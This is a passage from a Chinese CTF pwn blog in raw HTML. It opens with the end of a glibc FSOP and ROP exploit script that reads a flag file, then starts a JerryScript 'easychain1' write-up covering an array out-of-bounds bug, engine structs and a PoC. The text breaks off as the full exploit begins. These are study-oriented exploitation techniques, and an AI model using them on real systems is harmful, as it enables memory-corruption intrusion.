class="comment"># DT_STRTAB+34 = write =&gt; DT_DEBUG+34 = call_func</span></span><br><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\xb8&#x27;</span>, <span class="literal">False</span>) <span class="comment"># trigger _IO_flush_all</span></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x21ba70</span> </span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\x78&#x27;</span>) <span class="comment"># fix</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># FSOP(_IO_flush_all_lockp --&gt; IO_jump_t.__overflow)</span></span><br><span class="line">heap_addr = libc.address - (<span class="number">0xf4000</span> - <span class="number">0x10</span>)</span><br><span class="line">success(<span class="string">&quot;heap_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite _IO_2_1_stdout_</span></span><br><span class="line">write(_IO_2_1_stdout_offset,p32(<span class="number">0x800</span>)) <span class="comment"># flags</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0xc0</span>,p8(<span class="number">0xff</span>)) <span class="comment"># _mode &gt; 1</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0x48</span>,p64(heap_addr)) <span class="comment"># _IO_save_base(rdi)</span></span><br><span class="line">_IO_wstrn_jumps = libc.address + <span class="number">0x215dc0</span> <span class="comment"># vtable(_IO_wstrn_jumps)</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0xd8</span>,p64(_IO_wstrn_jumps+<span class="number">0x28</span>)) <span class="comment"># _IO_wstrn_overflow-&gt;_IO_wdefault_xsgetn</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite _wide_data</span></span><br><span class="line"><span class="comment"># _IO_write_ptr</span></span><br><span class="line">_IO_wide_data_1_offset = <span class="number">0x30d9a0</span>-<span class="number">0x10</span></span><br><span class="line">write(_IO_wide_data_1_offset+<span class="number">0x20</span>,p8(<span class="number">0x2</span>))</span><br><span class="line">write(_IO_wide_data_1_offset+<span class="number">0xe0</span>,p64(heap_addr+<span class="number">0x110</span>-<span class="number">0x18</span>)) <span class="comment"># vtable(fake)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP</span></span><br><span class="line">svcudp_reply26 = libc.address + <span class="number">0x16a1fa</span></span><br><span class="line">pop_r12_r13_r14_ret = libc.address + <span class="number">0x000000000002be4c</span></span><br><span class="line">pop_rsi_ret = libc.address + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdi_ret = libc.address + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rdx_r12_ret = libc.address + <span class="number">0x000000000011f497</span></span><br><span class="line">pop_rax_ret = libc.address + <span class="number">0x0000000000045eb0</span></span><br><span class="line">leave_ret = libc.address + <span class="number">0x00000000000562ec</span></span><br><span class="line">read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">syscall_ret = libc.address + <span class="number">0x91396</span></span><br><span class="line"></span><br><span class="line">rop = flat(</span><br><span class="line">    [<span class="string">b&#x27;./flag\x00\x00&#x27;</span>, pop_r12_r13_r14_ret],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, heap_addr - <span class="number">8</span>],</span><br><span class="line">    [leave_ret, pop_rdx_r12_ret],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>,<span class="number">0xdeadbeef</span>],</span><br><span class="line">    [pop_rdi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rsi_ret, <span class="number">0</span>],</span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, pop_rax_ret],</span><br><span class="line">    [<span class="number">2</span>, syscall_ret], <span class="comment"># open(&#x27;/flag&#x27;,0,0)</span></span><br><span class="line">    [pop_rdi_ret, <span class="number">3</span>],</span><br><span class="line">    [pop_rsi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0x40</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, read_addr], <span class="comment"># read(3,&amp;buf,0x40)</span></span><br><span class="line">    [pop_rdi_ret, <span class="number">1</span>],</span><br><span class="line">    [pop_rsi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0x40</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, write_addr], <span class="comment"># write(1,&amp;buf,0x40)</span></span><br><span class="line">    svcudp_reply26</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">write(<span class="number">0</span>,rop)</span><br><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\xb8&#x27;</span>, <span class="literal">False</span>) <span class="comment"># trigger _IO_flush_all</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>小结：</strong></p>
<ul>
<li>复习了一下 <code>_dl_runtime_resolve</code> 的知识</li>
<li>也认识了一个可以控制栈的 gadget（svcudp_reply+26）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7f78243fb1fa</span> &lt;svcudp_reply+<span class="number">26</span>&gt;:    mov    rbp,QWORD PTR [rdi+<span class="number">0x48</span>]  </span><br><span class="line"><span class="number">0x7f78243fb1fe</span> &lt;svcudp_reply+<span class="number">30</span>&gt;:    mov    rax,QWORD PTR [rbp+<span class="number">0x18</span>]  </span><br><span class="line"><span class="number">0x7f78243fb202</span> &lt;svcudp_reply+<span class="number">34</span>&gt;:    lea    r13,[rbp+<span class="number">0x10</span>]             </span><br><span class="line"><span class="number">0x7f78243fb206</span> &lt;svcudp_reply+<span class="number">38</span>&gt;:    mov    DWORD PTR [rbp+<span class="number">0x10</span>],<span class="number">0x0</span>   </span><br><span class="line"><span class="number">0x7f78243fb20d</span> &lt;svcudp_reply+<span class="number">45</span>&gt;:    mov    rdi,r13                    </span><br><span class="line"><span class="number">0x7f78243fb210</span> &lt;svcudp_reply+<span class="number">48</span>&gt;:    call   QWORD PTR [rax+<span class="number">0x28</span>]</span><br><span class="line">    <span class="comment">/* [rdi+0x48]中被放入ROP_addr */</span></span><br><span class="line">    <span class="comment">/* [rax+0x28]中被放入&#x27;leave ret&#x27; */</span></span><br></pre></td></tr></table></figure>
<p>由于 <code>_IO_switch_to_wget_mode</code> 可以控制 [RDX]，我们可以考虑用 <code>setcontext+61</code> 来控制栈，我这里就不演示了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/20/JavaScript%20pwn+Array%20OOB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/20/JavaScript%20pwn+Array%20OOB/" class="post-title-link" itemprop="url">JavaScript pwn+Array OOB</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-20 22:42:10 / Modified: 22:44:34" itemprop="dateCreated datePublished" datetime="2022-08-20T22:42:10+08:00">2022-08-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>easychain1 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64  \</span><br><span class="line">-m 512M \</span><br><span class="line">-cpu kvm64,+smep,+smap \</span><br><span class="line">-smp 4 \</span><br><span class="line">-kernel ./vmlinux \</span><br><span class="line">-append &quot;console=ttyS0 nokaslr quiet&quot; \</span><br><span class="line">-initrd rootfs.img \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">mdev -s</span><br><span class="line">/etc/init.d/rcS</span><br><span class="line">ifconfig lo up</span><br><span class="line"></span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line"></span><br><span class="line">poweroff -d 120000 -f &amp;</span><br><span class="line">setsid cttyhack setuidgid pwn /pwn</span><br><span class="line"></span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure>
<ul>
<li>没有加载驱动程序（和常规的 kernel 不太一样）</li>
<li>进入 kernel 后，程序会以 pwn 用户执行 pwn 文件</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bad sp value at call has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> n; <span class="comment">// [rsp+0h] [rbp-8018h]</span></span><br><span class="line">  <span class="keyword">int</span> js; <span class="comment">// [rsp+4h] [rbp-8014h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+8h] [rbp-8010h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+18h] [rbp-8000h] BYREF</span></span><br><span class="line">  __int64 v8[<span class="number">512</span>]; <span class="comment">// [rsp+7018h] [rbp-1000h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( v8 != (__int64 *)&amp;v7 )</span><br><span class="line">    ;</span><br><span class="line">  v8[<span class="number">511</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;pwn&gt; &quot;</span>);</span><br><span class="line">  n = read(<span class="number">0</span>, buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">  js = open(<span class="string">&quot;./pwn.js&quot;</span>, <span class="number">65</span>);</span><br><span class="line">  write(js, buf, n);</span><br><span class="line">  system(<span class="string">&quot;./jerry ./pwn.js&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>往 pwn.js 输入 JavaScript 脚本，然后用 jerry 解释该脚本</li>
</ul>
<p>jerryscript 是 JavaScript 轻量级引擎：（专门处理 JavaScript 脚本的虚拟机）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__assert_fail(</span><br><span class="line"><span class="string">&quot;source_file_p-&gt;type == SOURCE_SCRIPT&quot;</span>,</span><br><span class="line"><span class="string">&quot;/home/david/github/jerryscript/jerry-main/main-desktop.c&quot;</span>,</span><br><span class="line"><span class="number">0x94</span>u,</span><br><span class="line"><span class="string">&quot;main&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Version: %d.%d.%d%s\n&quot;</span>, <span class="number">3LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot; (0d496966)&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>Version: 3.0.0 (0d496966)</li>
</ul>
<p>源代码地址如下：（Google 搜索 0d496966）</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://gitee.com/mirrors/jerryscript/tree/0d4969661810b9e618485c284c361e597144e9b9">Gitee 极速下载/jerryscript - Gitee.com</a> </li>
</ul>
<p>jerryscript 3.0.0 cve 参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.security-database.com/cpe.php?detail=cpe%3A2.3%3Aa%3Ajerryscript%3Ajerryscript%3A3.0.0%3A*%3A*%3A*%3A*%3A*%3A*%3A*">Jerryscript Jerryscript 3.0.0 - Security Database (security-database.com)</a> </li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>可能是魔改源码，可能是 cve，所以我们先 bindiff 一下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://gitee.com/mirrors/jerryscript.git</span><br><span class="line">cd jerryscript</span><br><span class="line">git reset --hard 0d496966</span><br><span class="line">python tools/build.py --build-type=RelWithDebug --strip=off # 带有符号表</span><br></pre></td></tr></table></figure>
<ul>
<li>不过，如果安装成 DEBUG 版本，在调试的时候会遇到和 V8 一样的 <code>DCHECK</code>，导致我们无法正常调试漏洞</li>
<li>这里，我们可以修改一下源码（<code>jerryscript/jerry-core/jrt/jrt.h</code>）： </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JERRY_ASSERT(x)                                     \</span></span><br><span class="line"><span class="meta">  do                                                        \</span></span><br><span class="line"><span class="meta">  &#123;                                                         \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span> (JERRY_UNLIKELY (!(x)))                              \</span></span><br><span class="line"><span class="meta">    &#123;                                                       \</span></span><br><span class="line"><span class="meta">      jerry_assert_fail (#x, __FILE__, __func__, __LINE__); \</span></span><br><span class="line"><span class="meta">    &#125;                                                       \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line">	<span class="comment">/* &lt;---------------- @ ----------------&gt; */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JERRY_ASSERT(x)                                     \</span></span><br><span class="line"><span class="meta">  do                                                        \</span></span><br><span class="line"><span class="meta">  &#123;                                                         \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span> (false)                                              \</span></span><br><span class="line"><span class="meta">    &#123;                                                       \</span></span><br><span class="line"><span class="meta">      JERRY_UNUSED (x);                                     \</span></span><br><span class="line"><span class="meta">    &#125;                                                       \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>将 DEBUG 版本下的 <code>JERRY_ASSERT</code> 替换成 RELEASE 版本的 <code>JERRY_ASSERT</code> 即可 </li>
</ul>
<p>这个东西折腾了我好久，先是题目解包错误，导致文件 jerry 少了 400KB，后是 bindiff 分析错误，我换了好几个版本的 bindiff 和 IDA，最后发现是中文路径的问题，干</p>
<p>bindiff 分析如下：</p>
<p><img src="/2022/08/20/JavaScript%20pwn+Array%20OOB/1660095791443.png" alt="1660095791443">  </p>
<ul>
<li>说实话这个有点难找，大概 20~30 个函数的相似度都比较接近（可能是编译的问题）</li>
<li>漏洞点在 <code>ecma_builtin_array_prototype_object_pop</code>：（我在网上的 wp 上看的，要是硬要找还真的够呛）</li>
</ul>
<p><img src="/2022/08/20/JavaScript%20pwn+Array%20OOB/1660097546972.png" alt="1660097546972"> </p>
<ul>
<li>在 IDA 中找到对应的位置：</li>
</ul>
<p><img src="/2022/08/20/JavaScript%20pwn+Array%20OOB/1660097809707.png" alt="1660097809707"> </p>
<ul>
<li>调用 <code>ecma_delete_fast_array_properties</code> 的参数被修改了（<code>a2-1 -&gt; a2-2</code>）</li>
</ul>
<p>由于原文件没有符号，所以直接用 bindiff 对照断点位置：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a5ae2: jerryx_print_value <span class="comment">/* 在print执行时触发 */</span></span><br><span class="line"><span class="number">710</span>ab: ecma_builtin_array_prototype_object_pop <span class="comment">/* 断点触发时,用&#x27;p/x $rdi+0x10&#x27;来获取oob数组的地址 */</span></span><br></pre></td></tr></table></figure>
<p>在开始入侵之前要先了解一些 JavaScript 的知识</p>
<p><strong>Array</strong></p>
<p>Array 的结构体如下：（只挑出了 Array 会使用到的内容）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">ecma_object_descriptor_t</span> type_flags_refs;</span><br><span class="line">  <span class="keyword">jmem_cpointer_t</span> gc_next_cp;</span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">jmem_cpointer_t</span> property_list_cp; <span class="comment">/* 数组的存储区域 */</span></span><br><span class="line">    ...</span><br><span class="line">  &#125; u1;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">jmem_cpointer_t</span> prototype_cp; <span class="comment">/* 数组的原型所在位置 */</span></span><br><span class="line">    ...</span><br><span class="line">  &#125; u2;</span><br><span class="line">&#125; <span class="keyword">ecma_object_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">ecma_object_t</span> object; </span><br><span class="line">  ...</span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="keyword">uint32_t</span> length; <span class="comment">/* 数组的长度 */</span></span><br><span class="line">      <span class="keyword">uint32_t</span> length_prop_and_hole_count; </span><br><span class="line">    &#125; <span class="built_in">array</span>;</span><br><span class="line">  &#125; u;</span><br><span class="line">&#125; <span class="keyword">ecma_extended_object_t</span>;</span><br></pre></td></tr></table></figure>
<p>有几个属性值解释一下：</p>
<ul>
<li><code>array-&gt;object.u1.property_list_cp</code>：数组的存储区域</li>
<li><code>array-&gt;object.u2.prototype_cp</code>：数组的原型所在位置</li>
<li><code>array-&gt;u.array.length</code>：数组的长度</li>
</ul>
<p>我们来看一个具体的实例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]</span><br></pre></td></tr></table></figure>
<p>在 GDB 中查看：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x555555624f30</span></span><br><span class="line"><span class="number">0x555555624f30</span>:	<span class="number">0x0056005c00560014</span>	<span class="number">0x000000ec00000008</span></span><br><span class="line"><span class="number">0x555555624f40</span>:	<span class="number">0x0000002000000010</span>	<span class="number">0x0000004000000030</span></span><br><span class="line"><span class="number">0x555555624f50</span>:	<span class="number">0x0000006000000050</span>	<span class="number">0x0000008000000070</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>property_list_cp</code> 和 <code>prototype_cp</code>  的值分为 <code>0x5c</code> 和 <code>0x56</code>，它们在取值的时候，会调用一个函数 <code>jmem_decompress_pointer</code> 进行转换 </li>
<li>而 array 的寻址方式就是 <code>jerry_globals_heap + array-&gt;u1.property_list_cp &lt;&lt; 3</code>（其他的条目同理），通过这种方法，就能够减小内存开销（其实就有点像 shadow memory）</li>
</ul>
<p><strong>ArrayBuffer 和 DataView</strong></p>
<p>ArrayBuffer 对象用来表示通用的、固定长度的原始二进制数据缓冲区</p>
<p>ArrayBuffer 不能直接操作，而是要通过类型数组对象或 DataView 对象来操作，它们会将缓冲区中的数据表示为特定的格式，并通过这些格式来读写缓冲区的内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">ecma_extended_object_t</span> extended_object; <span class="comment">/* 扩展对象部分 */</span></span><br><span class="line">  <span class="keyword">void</span> *buffer_p; <span class="comment">/* 指向数组缓冲区对象的后备存储的指针 */</span></span><br><span class="line">  <span class="keyword">void</span> *arraybuffer_user_p; <span class="comment">/* 传递给免费回调的用户指针 */</span></span><br><span class="line">&#125; <span class="keyword">ecma_arraybuffer_pointer_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">ecma_extended_object_t</span> header; <span class="comment">/* 头部分 */</span></span><br><span class="line">  <span class="keyword">ecma_object_t</span> *buffer_p; <span class="comment">/* [ViewedArrayBuffer]内部槽 */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> byte_offset; <span class="comment">/* [ByteOffset]内部槽 */</span></span><br><span class="line">&#125; <span class="keyword">ecma_dataview_object_t</span>;</span><br></pre></td></tr></table></figure>
<p>ArrayBuffer 和 DataView 这两个对象在 JavaScript 引擎漏洞挖掘中经常出现</p>
<p>这里，我们注意到：</p>
<ul>
<li>ArrayBuffer 的结构体存在 <code>buffer_p</code> 这样的一个指针，它直接指向了 ArrayBuffer 所控制的内存区域（而不是像其他对象那样，通过偏移计算来得到所控制的内存区域）</li>
<li>DataView 的结构体中，<code>buffer_p</code> 则是指向 <code>ArrayBuffer-&gt;buffer_p</code></li>
</ul>
<p><strong>Array Out-Of-Boundary（数组越界）</strong></p>
<p>数组索引的边界检查是防止数组访问越界的有效手段，但是对数组索引的边界检查是比较耗时的，因此 JIT 引擎为了提高 Javascript 代码运行效率，对数组的边界检查在一定条件下进行了优化 </p>
<p>Bound Check Optimize（边界检查优化）主要分为 Bound Check Elimination（绑定检查消除）和 Bound Check Hoist（绑定检查提升）两部分，错误的 Elimination 或者 Hoist 都会引发 Array Out-Of-Boundary (OOB) 漏洞 </p>
<p>我们现在回到程序的漏洞点：</p>
<ul>
<li><code>ecma_delete_fast_array_properties</code> 的第二个参数改为 <code>len - 2</code></li>
<li>如果 <code>len</code> 的值为 “1”，就会被减为 “-1”，发生符号溢出</li>
</ul>
<p>案例如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>]; <span class="comment">/* len=1 */</span></span><br><span class="line">a.pop(); <span class="comment">/* 触发ecma_delete_fast_array_properties,导致len=-1 */</span></span><br><span class="line">print(a.length);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  pwn ./jerry ./pwn2.js </span><br><span class="line"><span class="number">4294967295</span> <span class="comment">/* 0xffffffff -&gt; len=-1 */</span></span><br><span class="line">[<span class="number">1</span>]    <span class="number">9011</span> segmentation fault  ./jerry ./pwn2.js</span><br></pre></td></tr></table></figure>
<ul>
<li>触发 Array OOB </li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/187739">Chakra漏洞调试笔记4——Array OOB</a> </p>
<p><strong>入侵思路</strong></p>
<p>完整的 exp 如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span>&#123;<span 